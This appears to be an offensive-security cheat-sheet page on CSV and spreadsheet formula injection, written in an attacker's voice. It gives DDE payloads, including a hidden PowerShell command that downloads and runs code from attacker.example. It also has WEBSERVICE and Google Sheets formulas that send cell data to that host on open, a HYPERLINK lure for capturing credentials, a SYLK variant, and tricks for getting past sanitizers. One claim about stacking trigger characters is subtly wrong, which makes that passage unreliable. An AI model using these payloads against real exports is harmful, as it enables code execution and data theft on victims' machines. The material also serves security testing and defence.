---
title: "CSV formula injection"
description: "Exported cells beginning with =, +, -, or @ are evaluated as formulas by spreadsheet software, enabling command execution via DDE and data exfiltration via web functions."
keywords:
  - csv injection
  - formula injection
  - spreadsheet
  - dde
  - webservice
  - hyperlink
---

# CSV

Spreadsheet software evaluates a cell as a formula when its text begins with certain characters. If an application exports attacker-controlled data to CSV (or TSV, SYLK, XLS) without neutralizing those cells, opening the file in Excel, LibreOffice Calc, or Google Sheets executes the attacker's formula on the victim's machine.

## Trigger characters

A cell is treated as a formula when it starts with any of:

```
=   +   -   @
```

Tab (`0x09`) and carriage return (`0x0D`) also lead into formula parsing in some clients. Any stored field that reaches the export (username, comment, product name, address line) is a candidate. Submit the payload through the normal app form; it fires when a victim opens the generated spreadsheet.

## Command execution via DDE

Excel's legacy Dynamic Data Exchange lets a formula launch an external program. The classic proof fires the calculator:

```
=cmd|'/c calc'!A1
```

Swap the command for something with impact, for example pulling and running a payload:

```
=cmd|'/c powershell -w hidden -c "iwr http://attacker.example/a|iex"'!A1
```

The victim is prompted to enable DDE/content, but social engineering and "trusted" internal reports often get that click. A cell is parsed as a formula only when its **first byte** is a trigger, so where a sanitizer strips or escapes only a leading `=` but overlooks the other triggers, lead with one of those instead. `+`, `-`, `@`, a tab (`0x09`), and a carriage return (`0x0D`) all start formula parsing:

```
@cmd|'/c calc'!A1
+cmd|'/c calc'!A1
```

A leading tab or CR before `=` works the same way: the whitespace is consumed and `=cmd|'/c calc'!A1` still parses. Prefixing a second trigger after the one being removed does not help, since once the first byte is stripped the survivor starts with text.

## Data exfiltration without a click

Some functions evaluate on open without the DDE prompt, leaking cell data to an attacker server. `WEBSERVICE` fetches a URL and can carry adjacent data in the query string:

```
=WEBSERVICE("http://attacker.example/x?v="&A1)
=WEBSERVICE(CONCATENATE("http://attacker.example/?",A1))
```

Google Sheets offers equivalents that pull remote content and exfiltrate on load:

```
=IMPORTXML("http://attacker.example/?d="&A2,"//a")
=IMPORTDATA("http://attacker.example/?d="&A2)
=IMAGE("http://attacker.example/?d="&A2)
```

## Hyperlink luring

`HYPERLINK` renders clickable text that masks a hostile destination, useful for credential capture or payload delivery:

```
=HYPERLINK("http://attacker.example/login","Open quarterly report")
```

## TSV, SYLK, and XLS variants

The same formula cells apply when the export is tab-separated; the trigger characters are identical, only the delimiter differs. SYLK files parse formulas directly, so a file served with a `.slk` extension and an `ID;P` header executes cell expressions:

```
ID;P
C;X1;Y1;K0;E=cmd|'/c calc'!A1
E
```

Real `.xls` and `.xlsx` exports carry formulas natively, so any attacker string written into a formula-typed cell evaluates with no leading-character trick required.

## References

- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [PayloadsAllTheThings: CSV Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection)
